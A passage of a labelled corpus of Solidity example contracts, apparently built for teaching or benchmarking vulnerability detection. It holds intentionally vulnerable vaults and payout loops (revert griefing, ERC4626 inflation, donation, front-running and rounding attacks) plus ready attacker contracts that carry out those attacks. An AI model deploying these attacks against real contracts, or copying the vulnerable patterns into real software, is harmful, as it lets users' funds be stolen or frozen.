    mapping(address => bool) public whitelist;

    /**
     * @notice INEFFICIENT: Array requires iteration
     */
    // address[] public whitelistedAddresses;

    /**
     * @notice EFFICIENT: Use uint256 for counters (not uint8)
     * @dev Despite being smaller, uint8/uint16 require conversion (costs gas)
     */
    uint256 public operationCounter;

    /**
     * @notice EFFICIENT: Pack boolean flags into single uint256
     */
    uint256 private _packedFlags;

    function setFlag(uint8 flagIndex, bool value) public {
        if (value) {
            _packedFlags |= (1 << flagIndex);  // Set bit
        } else {
            _packedFlags &= ~(1 << flagIndex);  // Clear bit
        }
    }

    function getFlag(uint8 flagIndex) public view returns (bool) {
        return (_packedFlags & (1 << flagIndex)) != 0;
    }

    /**
     * @notice EFFICIENT: Cache storage reads in memory
     */
    function expensiveOperation() public {
        // BAD: Reading from storage multiple times
        // for (uint i = 0; i < operationCounter; i++) { ... }

        // GOOD: Cache in memory
        uint256 cachedCounter = operationCounter;
        for (uint i = 0; i < cachedCounter; i++) {
            // Use cached value
        }
    }
}
```

---

## FILE: public/baselines/solidity/gas/20-revert-griefing.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Revert Griefing (DoS)
 * @notice BASELINE: DoS via intentional revert
 * @dev One bad actor can block all operations
 *
 * METADATA:
 * - Category: gas
 * - Tier: core
 * - Safe: false (vulnerable pattern shown)
 * - Immunefi Level: 3 (Medium)
 * - Tags: ["dos", "revert-griefing"]
 */
contract RevertGriefing {
    address[] public payees;
    mapping(address => uint256) public pendingPayments;

    event PaymentPrepared(address payee, uint256 amount);
    event PaymentSent(address payee, uint256 amount);
    event PaymentFailed(address payee, uint256 amount);

    function addPayee(address payee) public {
        payees.push(payee);
    }

    /**
     * @notice VULNERABLE: Push payments in loop
     * @dev If ANY payee reverts, entire batch fails
     *
     * EXPLOIT:
     * 1. Attacker deploys contract with receive() that reverts
     * 2. Attacker adds their contract as payee
     * 3. When distributeVulnerable() is called, it reaches attacker's contract
     * 4. Attacker's receive() reverts
     * 5. ENTIRE transaction fails - nobody gets paid (DoS)
     */
    function distributeVulnerable() public {
        for (uint256 i = 0; i < payees.length; i++) {
            payable(payees[i]).transfer(pendingPayments[payees[i]]);
            emit PaymentSent(payees[i], pendingPayments[payees[i]]);
        }
    }

    /**
     * @notice SAFE: Pull payment pattern
     * @dev Users pull their own payments
     */
    function preparePullPayments() public {
        for (uint256 i = 0; i < payees.length; i++) {
            pendingPayments[payees[i]] += 1 ether;
            emit PaymentPrepared(payees[i], 1 ether);
        }
        // No external calls - can't be griefed
    }

    function withdraw() public {
        uint256 amount = pendingPayments[msg.sender];
        require(amount > 0, "No pending payment");
        pendingPayments[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
        emit PaymentSent(msg.sender, amount);
    }

    /**
     * @notice SAFE: Try-catch for external calls
     * @dev Continue even if one payment fails
     */
    function distributeSafe() public {
        for (uint256 i = 0; i < payees.length; i++) {
            try this.sendPayment(payable(payees[i]), pendingPayments[payees[i]]) {
                emit PaymentSent(payees[i], pendingPayments[payees[i]]);
            } catch {
                emit PaymentFailed(payees[i], pendingPayments[payees[i]]);
                // Failed, but continue with others
            }
        }
    }

    function sendPayment(address payable recipient, uint256 amount) external {
        recipient.transfer(amount);
    }

    receive() external payable {}
}

/**
 * @title Griefing Attacker
 * @notice Contract that reverts on receive to grief payments
 */
contract GriefingAttacker {
    receive() external payable {
        revert("Griefing attack!");
    }
}
```

---

## DEFI PATTERNS (21-28 + NEW 61-64)

## FILE: public/baselines/solidity/defi/21-staking-basic.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Basic Staking Contract
 * @notice BASELINE: Simple staking with rewards
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: true
 * - Tags: ["staking", "rewards"]
 */
contract StakingBasic {
    mapping(address => uint256) public stakes;
    mapping(address => uint256) public stakingTimestamp;
    mapping(address => uint256) public rewards;

    uint256 public rewardRate = 10; // 10% per year (simplified)
    uint256 public constant YEAR = 365 days;

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);
    event RewardClaimed(address indexed user, uint256 amount);

    function stake() public payable {
        require(msg.value > 0, "Must stake > 0");

        // Claim pending rewards first
        if (stakes[msg.sender] > 0) {
            _updateRewards(msg.sender);
        }

        stakes[msg.sender] += msg.value;
        stakingTimestamp[msg.sender] = block.timestamp;

        emit Staked(msg.sender, msg.value);
    }

    function unstake(uint256 amount) public {
        require(stakes[msg.sender] >= amount, "Insufficient stake");

        // Update rewards before unstaking
        _updateRewards(msg.sender);

        stakes[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);

        emit Unstaked(msg.sender, amount);
    }

    function claimRewards() public {
        _updateRewards(msg.sender);

        uint256 reward = rewards[msg.sender];
        require(reward > 0, "No rewards");

        rewards[msg.sender] = 0;
        payable(msg.sender).transfer(reward);

        emit RewardClaimed(msg.sender, reward);
    }

    function _updateRewards(address user) internal {
        uint256 stakingDuration = block.timestamp - stakingTimestamp[user];
        uint256 reward = (stakes[user] * rewardRate * stakingDuration) / (100 * YEAR);

        rewards[user] += reward;
        stakingTimestamp[user] = block.timestamp;
    }

    function calculatePendingReward(address user) public view returns (uint256) {
        uint256 stakingDuration = block.timestamp - stakingTimestamp[user];
        return (stakes[user] * rewardRate * stakingDuration) / (100 * YEAR);
    }

    receive() external payable {}
}
```

---

## FILE: public/baselines/solidity/defi/22-liquidity-pool-amm.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Liquidity Pool AMM
 * @notice BASELINE: Simplified constant product AMM (Uniswap-style)
 * @dev x * y = k formula
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: true (simplified, production needs more checks)
 * - Tags: ["amm", "liquidity", "swap"]
 */
contract LiquidityPoolAMM {
    uint256 public reserveA;
    uint256 public reserveB;
    uint256 public totalLiquidity;

    mapping(address => uint256) public liquidity;

    event LiquidityAdded(address indexed provider, uint256 amountA, uint256 amountB, uint256 liquidityMinted);
    event LiquidityRemoved(address indexed provider, uint256 amountA, uint256 amountB, uint256 liquidityBurned);
    event Swap(address indexed user, uint256 amountIn, uint256 amountOut, bool aToB);

    /**
     * @notice Add liquidity to pool
     * @dev First provider sets the ratio
     */
    function addLiquidity(uint256 amountA, uint256 amountB) public payable returns (uint256 liquidityMinted) {
        require(amountA > 0 && amountB > 0, "Amounts must be > 0");

        if (totalLiquidity == 0) {
            // First liquidity provider
            liquidityMinted = sqrt(amountA * amountB);
        } else {
            // Subsequent providers must match ratio
            uint256 liquidityA = (amountA * totalLiquidity) / reserveA;
            uint256 liquidityB = (amountB * totalLiquidity) / reserveB;
            liquidityMinted = min(liquidityA, liquidityB);
        }

        require(liquidityMinted > 0, "Insufficient liquidity minted");

        reserveA += amountA;
        reserveB += amountB;
        totalLiquidity += liquidityMinted;
        liquidity[msg.sender] += liquidityMinted;

        emit LiquidityAdded(msg.sender, amountA, amountB, liquidityMinted);
    }

    /**
     * @notice Remove liquidity from pool
     */
    function removeLiquidity(uint256 liquidityAmount) public returns (uint256 amountA, uint256 amountB) {
        require(liquidity[msg.sender] >= liquidityAmount, "Insufficient liquidity");

        amountA = (liquidityAmount * reserveA) / totalLiquidity;
        amountB = (liquidityAmount * reserveB) / totalLiquidity;

        liquidity[msg.sender] -= liquidityAmount;
        totalLiquidity -= liquidityAmount;
        reserveA -= amountA;
        reserveB -= amountB;

        // Transfer tokens back (simplified - in production use token transfers)
        payable(msg.sender).transfer(amountA + amountB);

        emit LiquidityRemoved(msg.sender, amountA, amountB, liquidityAmount);
    }

    /**
     * @notice Swap token A for token B
     * @dev Constant product formula: x * y = k
     */
    function swapAforB(uint256 amountAIn) public returns (uint256 amountBOut) {
        require(amountAIn > 0, "Amount must be > 0");

        // Calculate output using constant product formula
        // (x + dx) * (y - dy) = x * y
        // dy = y * dx / (x + dx)
        uint256 amountBOut = (amountAIn * reserveB) / (reserveA + amountAIn);

        require(amountBOut < reserveB, "Insufficient liquidity");

        reserveA += amountAIn;
        reserveB -= amountBOut;

        emit Swap(msg.sender, amountAIn, amountBOut, true);
        return amountBOut;
    }

    /**
     * @notice Swap token B for token A
     */
    function swapBforA(uint256 amountBIn) public returns (uint256 amountAOut) {
        require(amountBIn > 0, "Amount must be > 0");

        uint256 amountAOut = (amountBIn * reserveA) / (reserveB + amountBIn);

        require(amountAOut < reserveA, "Insufficient liquidity");

        reserveB += amountBIn;
        reserveA -= amountAOut;

        emit Swap(msg.sender, amountBIn, amountAOut, false);
        return amountAOut;
    }

    // Helper functions
    function sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    receive() external payable {}
}
```

---

## FILE: public/baselines/solidity/defi/23-vault-erc4626.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ERC4626 Vault (Simplified)
 * @notice BASELINE: Tokenized vault standard
 * @dev Safe implementation without attack vectors
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: true
 * - Standard: ERC4626
 * - Tags: ["vault", "shares", "yield"]
 */
contract VaultERC4626 {
    string public name = "Vault Shares";
    string public symbol = "vToken";
    uint8 public decimals = 18;

    uint256 public totalAssets;
    uint256 public totalShares;

    mapping(address => uint256) public sharesOf;

    event Deposit(address indexed user, uint256 assets, uint256 shares);
    event Withdraw(address indexed user, uint256 assets, uint256 shares);

    /**
     * @notice Deposit assets and receive shares
     * @dev Shares = (assets * totalShares) / totalAssets
     */
    function deposit(uint256 assets) public payable returns (uint256 shares) {
        require(assets > 0, "Must deposit > 0");
        require(msg.value == assets, "ETH mismatch");

        if (totalShares == 0) {
            // First depositor gets 1:1 ratio
            shares = assets;
        } else {
            // Calculate shares based on current ratio
            shares = (assets * totalShares) / totalAssets;
        }

        require(shares > 0, "Shares must be > 0");

        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;

        emit Deposit(msg.sender, assets, shares);
    }

    /**
     * @notice Redeem shares for assets
     * @dev Assets = (shares * totalAssets) / totalShares
     */
    function withdraw(uint256 shares) public returns (uint256 assets) {
        require(shares > 0, "Must withdraw > 0");
        require(sharesOf[msg.sender] >= shares, "Insufficient shares");

        assets = (shares * totalAssets) / totalShares;

        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assets;

        payable(msg.sender).transfer(assets);

        emit Withdraw(msg.sender, assets, shares);
    }

    /**
     * @notice Convert assets to shares
     */
    function convertToShares(uint256 assets) public view returns (uint256) {
        if (totalShares == 0) return assets;
        return (assets * totalShares) / totalAssets;
    }

    /**
     * @notice Convert shares to assets
     */
    function convertToAssets(uint256 shares) public view returns (uint256) {
        if (totalShares == 0) return 0;
        return (shares * totalAssets) / totalShares;
    }

    /**
     * @notice Simulate yield by increasing totalAssets
     * @dev In production, this would come from yield strategies
     */
    function simulateYield(uint256 amount) public payable {
        require(msg.value == amount, "ETH mismatch");
        totalAssets += amount;
    }
}
```

---

## FILE: public/baselines/solidity/defi/24-flashloan-safe.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Flash Loan (Safe)
 * @notice BASELINE: Flash loan with balance verification
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: true
 * - Tags: ["flashloan", "defi"]
 */

interface IFlashLoanReceiver {
    function executeOperation(uint256 amount, uint256 fee) external returns (bool);
}

contract FlashLoanSafe {
    uint256 public poolBalance = 1000 ether;
    uint256 public feePercent = 1; // 0.1% fee

    event FlashLoan(address indexed borrower, uint256 amount, uint256 fee);

    /**
     * @notice Execute flash loan
     * @dev SAFE: Verifies balance is restored + fee
     */
    function flashLoan(address receiver, uint256 amount) public {
        uint256 balanceBefore = poolBalance;
        require(poolBalance >= amount, "Insufficient liquidity");

        uint256 fee = (amount * feePercent) / 1000;

        // Send funds to borrower
        poolBalance -= amount;
        payable(receiver).transfer(amount);

        // Execute borrower's logic
        require(
            IFlashLoanReceiver(receiver).executeOperation(amount, fee),
            "Flash loan execution failed"
        );

        // CRITICAL: Verify repayment + fee
        require(
            poolBalance >= balanceBefore + fee,
            "Flash loan not repaid with fee"
        );

        emit FlashLoan(receiver, amount, fee);
    }

    function addLiquidity() public payable {
        poolBalance += msg.value;
    }

    receive() external payable {
        poolBalance += msg.value;
    }
}
```

---

## FILE: public/baselines/solidity/defi/25-yield-farming.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Yield Farming
 * @notice BASELINE: Time-weighted reward distribution
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: true
 * - Tags: ["yield", "farming", "rewards"]
 */
contract YieldFarming {
    uint256 public rewardPerSecond = 1e15; // 0.001 ETH per second
    uint256 public lastUpdateTime;
    uint256 public rewardPerTokenStored;

    mapping(address => uint256) public stakes;
    mapping(address => uint256) public userRewardPerTokenPaid;
    mapping(address => uint256) public rewards;

    uint256 public totalStaked;

    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardPaid(address indexed user, uint256 reward);

    modifier updateReward(address account) {
        rewardPerTokenStored = rewardPerToken();
        lastUpdateTime = block.timestamp;

        if (account != address(0)) {
            rewards[account] = earned(account);
            userRewardPerTokenPaid[account] = rewardPerTokenStored;
        }
        _;
    }

    function stake(uint256 amount) public payable updateReward(msg.sender) {
        require(amount > 0, "Cannot stake 0");
        require(msg.value == amount, "ETH mismatch");

        totalStaked += amount;
        stakes[msg.sender] += amount;

        emit Staked(msg.sender, amount);
    }

    function withdraw(uint256 amount) public updateReward(msg.sender) {
        require(amount > 0, "Cannot withdraw 0");
        require(stakes[msg.sender] >= amount, "Insufficient stake");

        totalStaked -= amount;
        stakes[msg.sender] -= amount;

        payable(msg.sender).transfer(amount);

        emit Withdrawn(msg.sender, amount);
    }

    function getReward() public updateReward(msg.sender) {
        uint256 reward = rewards[msg.sender];
        if (reward > 0) {
            rewards[msg.sender] = 0;
            payable(msg.sender).transfer(reward);
            emit RewardPaid(msg.sender, reward);
        }
    }

    function rewardPerToken() public view returns (uint256) {
        if (totalStaked == 0) {
            return rewardPerTokenStored;
        }
        return rewardPerTokenStored +
            ((block.timestamp - lastUpdateTime) * rewardPerSecond * 1e18) / totalStaked;
    }

    function earned(address account) public view returns (uint256) {
        return (stakes[account] * (rewardPerToken() - userRewardPerTokenPaid[account])) / 1e18 +
            rewards[account];
    }

    receive() external payable {}
}
```

---

## FILE: public/baselines/solidity/defi/26-governance-voting.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Governance Voting
 * @notice BASELINE: Token-weighted voting
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: true
 * - Tags: ["governance", "voting", "dao"]
 */
contract GovernanceVoting {
    struct Proposal {
        string description;
        uint256 votesFor;
        uint256 votesAgainst;
        uint256 deadline;
        bool executed;
        mapping(address => bool) hasVoted;
    }

    mapping(uint256 => Proposal) public proposals;
    mapping(address => uint256) public votingPower;

    uint256 public proposalCount;
    uint256 public constant VOTING_PERIOD = 3 days;
    uint256 public constant QUORUM = 1000; // Minimum votes needed

    event ProposalCreated(uint256 indexed proposalId, string description);
    event Voted(uint256 indexed proposalId, address indexed voter, bool support, uint256 weight);
    event ProposalExecuted(uint256 indexed proposalId);

    function delegateVotingPower(address to, uint256 amount) public {
        votingPower[to] += amount;
    }

    function createProposal(string memory description) public returns (uint256) {
        uint256 proposalId = proposalCount++;

        Proposal storage proposal = proposals[proposalId];
        proposal.description = description;
        proposal.deadline = block.timestamp + VOTING_PERIOD;

        emit ProposalCreated(proposalId, description);
        return proposalId;
    }

    function vote(uint256 proposalId, bool support) public {
        Proposal storage proposal = proposals[proposalId];

        require(block.timestamp < proposal.deadline, "Voting ended");
        require(!proposal.hasVoted[msg.sender], "Already voted");
        require(votingPower[msg.sender] > 0, "No voting power");

        uint256 weight = votingPower[msg.sender];

        if (support) {
            proposal.votesFor += weight;
        } else {
            proposal.votesAgainst += weight;
        }

        proposal.hasVoted[msg.sender] = true;

        emit Voted(proposalId, msg.sender, support, weight);
    }

    function executeProposal(uint256 proposalId) public {
        Proposal storage proposal = proposals[proposalId];

        require(block.timestamp >= proposal.deadline, "Voting not ended");
        require(!proposal.executed, "Already executed");
        require(proposal.votesFor + proposal.votesAgainst >= QUORUM, "Quorum not reached");
        require(proposal.votesFor > proposal.votesAgainst, "Proposal rejected");

        proposal.executed = true;

        // Execute proposal logic here

        emit ProposalExecuted(proposalId);
    }

    function getProposalVotes(uint256 proposalId) public view returns (uint256 votesFor, uint256 votesAgainst) {
        Proposal storage proposal = proposals[proposalId];
        return (proposal.votesFor, proposal.votesAgainst);
    }
}
```

---

## FILE: public/baselines/solidity/defi/27-timelock-controller.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Timelock Controller
 * @notice BASELINE: Delayed execution for governance
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: true
 * - Tags: ["timelock", "governance", "security"]
 */
contract TimelockController {
    uint256 public constant MIN_DELAY = 2 days;
    uint256 public constant MAX_DELAY = 30 days;

    uint256 public delay = 2 days;
    address public admin;

    mapping(bytes32 => uint256) public queuedTransactions;

    event TransactionQueued(bytes32 indexed txHash, address target, uint256 value, bytes data, uint256 eta);
    event TransactionExecuted(bytes32 indexed txHash, address target, uint256 value, bytes data);
    event TransactionCancelled(bytes32 indexed txHash);

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    constructor() {
        admin = msg.sender;
    }

    /**
     * @notice Queue a transaction for future execution
     */
    function queueTransaction(
        address target,
        uint256 value,
        bytes memory data
    ) public onlyAdmin returns (bytes32) {
        uint256 eta = block.timestamp + delay;

        bytes32 txHash = keccak256(abi.encode(target, value, data, eta));

        queuedTransactions[txHash] = eta;

        emit TransactionQueued(txHash, target, value, data, eta);
        return txHash;
    }

    /**
     * @notice Execute a queued transaction after delay
     */
    function executeTransaction(
        address target,
        uint256 value,
        bytes memory data,
        uint256 eta
    ) public payable onlyAdmin returns (bytes memory) {
        bytes32 txHash = keccak256(abi.encode(target, value, data, eta));

        require(queuedTransactions[txHash] != 0, "Transaction not queued");
        require(block.timestamp >= eta, "Transaction not ready");
        require(block.timestamp <= eta + 7 days, "Transaction expired");

        queuedTransactions[txHash] = 0;

        (bool success, bytes memory returnData) = target.call{value: value}(data);
        require(success, "Transaction execution failed");

        emit TransactionExecuted(txHash, target, value, data);
        return returnData;
    }

    /**
     * @notice Cancel a queued transaction
     */
    function cancelTransaction(
        address target,
        uint256 value,
        bytes memory data,
        uint256 eta
    ) public onlyAdmin {
        bytes32 txHash = keccak256(abi.encode(target, value, data, eta));

        require(queuedTransactions[txHash] != 0, "Transaction not queued");

        queuedTransactions[txHash] = 0;

        emit TransactionCancelled(txHash);
    }

    receive() external payable {}
}
```

---

## FILE: public/baselines/solidity/defi/28-oracle-price-feed.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Oracle Price Feed
 * @notice BASELINE: Chainlink-style price oracle
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: true
 * - Tags: ["oracle", "price-feed", "chainlink"]
 */
contract OraclePriceFeed {
    address public owner;

    struct PriceData {
        uint256 price;
        uint256 timestamp;
        uint256 roundId;
    }

    mapping(uint256 => PriceData) public priceHistory;
    uint256 public latestRound;

    uint256 public constant STALE_PRICE_DELAY = 1 hours;

    event PriceUpdated(uint256 indexed roundId, uint256 price, uint256 timestamp);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice Update price (in production, this would be done by Chainlink nodes)
     */
    function updatePrice(uint256 newPrice) public onlyOwner {
        require(newPrice > 0, "Price must be > 0");

        latestRound++;

        priceHistory[latestRound] = PriceData({
            price: newPrice,
            timestamp: block.timestamp,
            roundId: latestRound
        });

        emit PriceUpdated(latestRound, newPrice, block.timestamp);
    }

    /**
     * @notice Get latest price with staleness check
     */
    function getLatestPrice() public view returns (uint256 price, uint256 timestamp) {
        require(latestRound > 0, "No price data");

        PriceData memory data = priceHistory[latestRound];

        require(
            block.timestamp - data.timestamp <= STALE_PRICE_DELAY,
            "Price data is stale"
        );

        return (data.price, data.timestamp);
    }

    /**
     * @notice Get price at specific round
     */
    function getPriceAtRound(uint256 roundId) public view returns (uint256 price, uint256 timestamp) {
        require(roundId > 0 && roundId <= latestRound, "Invalid round");

        PriceData memory data = priceHistory[roundId];
        return (data.price, data.timestamp);
    }

    /**
     * @notice Calculate TWAP (Time-Weighted Average Price)
     */
    function getTWAP(uint256 periods) public view returns (uint256) {
        require(periods > 0 && periods <= latestRound, "Invalid periods");

        uint256 sum = 0;
        uint256 startRound = latestRound - periods + 1;

        for (uint256 i = startRound; i <= latestRound; i++) {
            sum += priceHistory[i].price;
        }

        return sum / periods;
    }
}
```

---

## 🆕 NEW: DEFI ACCOUNTING INVARIANTS (61-64)

## FILE: public/baselines/solidity/defi/61-vault-inflation-attack.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vault Inflation Attack
 * @notice BASELINE: ERC4626 first depositor attack
 * @dev VULNERABLE: Attacker can inflate share price
 *
 * ATTACK VECTOR:
 * 1. Attacker deposits 1 wei, gets 1 share
 * 2. Attacker donates large amount directly to vault (bypassing deposit())
 * 3. Share price becomes huge: 1 share = millions of wei
 * 4. Next depositor loses funds due to rounding
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: false
 * - Immunefi Level: 4 (High)
 * - Tags: ["erc4626", "inflation-attack", "first-depositor"]
 */
contract VaultInflationVulnerable {
    uint256 public totalAssets;
    uint256 public totalShares;

    mapping(address => uint256) public sharesOf;

    event Deposit(address user, uint256 assets, uint256 shares);
    event Donate(address donor, uint256 amount);

    /**
     * @notice VULNERABLE: No minimum shares check
     */
    function deposit(uint256 assets) public payable returns (uint256 shares) {
        require(msg.value == assets, "ETH mismatch");

        if (totalShares == 0) {
            shares = assets;  // VULNERABLE: Can be just 1 wei
        } else {
            shares = (assets * totalShares) / totalAssets;  // VULNERABLE: Rounds down
        }

        // ISSUE: If shares == 0 due to rounding, user loses funds!
        require(shares > 0, "Shares = 0");

        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;

        emit Deposit(msg.sender, assets, shares);
    }

    /**
     * @notice Attacker uses this to manipulate share price
     */
    function donateToVault() public payable {
        totalAssets += msg.value;
        emit Donate(msg.sender, msg.value);
    }

    function withdraw(uint256 shares) public returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares);

        assets = (shares * totalAssets) / totalShares;

        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assets;

        payable(msg.sender).transfer(assets);
    }
}

/**
 * @title Inflation Attacker
 * @notice Demonstrates the inflation attack
 */
contract InflationAttacker {
    VaultInflationVulnerable public vault;

    constructor(address _vault) {
        vault = VaultInflationVulnerable(_vault);
    }

    /**
     * @notice Execute inflation attack
     * STEP 1: Deposit 1 wei
     * STEP 2: Donate 1 million wei
     * STEP 3: Next depositor with 1000 wei gets 0 shares (rounds down)
     */
    function attack() public payable {
        // Step 1: Deposit 1 wei, get 1 share
        vault.deposit{value: 1}(1);

        // Step 2: Donate 1 million wei directly
        // Now: totalAssets = 1,000,001, totalShares = 1
        // Share price = 1,000,001 wei per share
        vault.donateToVault{value: 1000000}();

        // Step 3: Next user deposits 1000 wei
        // shares = (1000 * 1) / 1,000,001 = 0 (rounds down)
        // User loses funds!
    }
}
```

---

## FILE: public/baselines/solidity/defi/62-vault-donation-attack.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vault Donation Attack (Rounding Exploit)
 * @notice BASELINE: Profit from donation + rounding
 * @dev VULNERABLE: Attacker donates to profit from rounding errors
 *
 * ATTACK VECTOR:
 * 1. Alice has 100 shares, Bob has 100 shares (200 total)
 * 2. Attacker donates 1 wei
 * 3. Due to rounding, attacker's share value increases
 * 4. Attacker withdraws for profit
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: false
 * - Immunefi Level: 3 (Medium)
 * - Tags: ["erc4626", "rounding", "donation-attack"]
 */
contract VaultDonationVulnerable {
    uint256 public totalAssets;
    uint256 public totalShares;

    mapping(address => uint256) public sharesOf;

    event Deposit(address user, uint256 assets, uint256 shares);
    event Withdraw(address user, uint256 assets, uint256 shares);

    function deposit(uint256 assets) public payable returns (uint256 shares) {
        require(msg.value == assets);

        if (totalShares == 0) {
            shares = assets;
        } else {
            // VULNERABLE: Integer division rounds down
            shares = (assets * totalShares) / totalAssets;
        }

        require(shares > 0);

        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;

        emit Deposit(msg.sender, assets, shares);
    }

    function withdraw(uint256 shares) public returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares);

        // VULNERABLE: Rounding can give attacker extra assets
        assets = (shares * totalAssets) / totalShares;

        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assets;

        payable(msg.sender).transfer(assets);

        emit Withdraw(msg.sender, assets, shares);
    }

    // Direct transfer to vault (donation)
    receive() external payable {
        totalAssets += msg.value;
    }
}

/**
 * @title Donation Attacker
 * @notice Exploits rounding by strategic donations
 */
contract DonationAttacker {
    VaultDonationVulnerable public vault;

    constructor(address _vault) {
        vault = VaultDonationVulnerable(_vault);
    }

    /**
     * @notice Execute donation attack
     * Assumes vault has: 200 shares, 200 assets (1:1 ratio)
     */
    function attack() public payable {
        // Step 1: Deposit to get shares
        vault.deposit{value: 100 ether}(100 ether);
        // Now have: 100 shares, vault has 300 shares / 300 assets

        // Step 2: Donate small amount
        payable(address(vault)).transfer(1 wei);
        // Now: 300 shares / 300.000000000000000001 assets

        // Step 3: Withdraw
        // assets = (100 * 300000000000000000001) / 300
        // Due to rounding, may get slightly more than deposited
        vault.withdraw(100 ether);

        // Profit from rounding!
    }
}
```

---

## FILE: public/baselines/solidity/defi/63-vault-share-manipulation.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vault Share Price Manipulation
 * @notice BASELINE: Manipulating share price via front-running
 * @dev VULNERABLE: Attacker front-runs deposits
 *
 * ATTACK VECTOR:
 * 1. Victim queues large deposit
 * 2. Attacker sees pending tx in mempool
 * 3. Attacker front-runs: deposit small amount + donate large amount
 * 4. Share price inflates
 * 5. Victim's deposit executes at inflated price → gets fewer shares
 * 6. Attacker back-runs: withdraws at victim's expense
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: false
 * - Immunefi Level: 4 (High)
 * - Tags: ["erc4626", "front-running", "mev", "sandwich"]
 */
contract VaultShareManipulation {
    uint256 public totalAssets;
    uint256 public totalShares;

    mapping(address => uint256) public sharesOf;

    event Deposit(address user, uint256 assets, uint256 shares);
    event Withdraw(address user, uint256 assets, uint256 shares);

    function deposit(uint256 assets) public payable returns (uint256 shares) {
        require(msg.value == assets);

        if (totalShares == 0) {
            shares = assets;
        } else {
            shares = (assets * totalShares) / totalAssets;
        }

        require(shares > 0);

        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;

        emit Deposit(msg.sender, assets, shares);
    }

    function withdraw(uint256 shares) public returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares);

        assets = (shares * totalAssets) / totalShares;

        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assets;

        payable(msg.sender).transfer(assets);

        emit Withdraw(msg.sender, assets, shares);
    }

    receive() external payable {
        totalAssets += msg.value;
    }
}

/**
 * @title Share Manipulation Attacker
 * @notice Front-runs victim's deposit
 */
contract ShareManipulationAttacker {
    VaultShareManipulation public vault;

    constructor(address _vault) {
        vault = VaultShareManipulation(_vault);
    }

    /**
     * @notice Execute sandwich attack on victim's deposit
     * Assumes victim is about to deposit 100 ETH
     */
    function frontRun() public payable {
        // Front-run: Deposit small amount
        vault.deposit{value: 1 ether}(1 ether);

        // Front-run: Donate to inflate share price
        payable(address(vault)).transfer(99 ether);

        // Now: Victim's deposit executes at inflated price
        // Victim gets fewer shares than expected
    }

    function backRun() public {
        // Back-run: Withdraw all shares
        // Profit from victim's deposit
        uint256 shares = vault.sharesOf(address(this));
        vault.withdraw(shares);
    }
}
```

---

## FILE: public/baselines/solidity/defi/64-vault-rounding-exploit.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vault Rounding Exploit (Precision Loss)
 * @notice BASELINE: Exploiting rounding in share calculations
 * @dev VULNERABLE: Dust amounts cause share rounding to zero
 *
 * ATTACK VECTOR:
 * 1. Many users deposit dust amounts (1-10 wei)
 * 2. Each gets 0 shares due to rounding down
 * 3. Their deposits stay in vault but no shares issued
 * 4. Existing shareholders profit from "free" assets
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: false
 * - Immunefi Level: 3 (Medium)
 * - Tags: ["erc4626", "rounding", "precision-loss"]
 */
contract VaultRoundingVulnerable {
    uint256 public totalAssets;
    uint256 public totalShares;

    mapping(address => uint256) public sharesOf;

    event Deposit(address user, uint256 assets, uint256 shares);
    event Withdraw(address user, uint256 assets, uint256 shares);
    event DepositFailed(address user, uint256 assets, string reason);

    /**
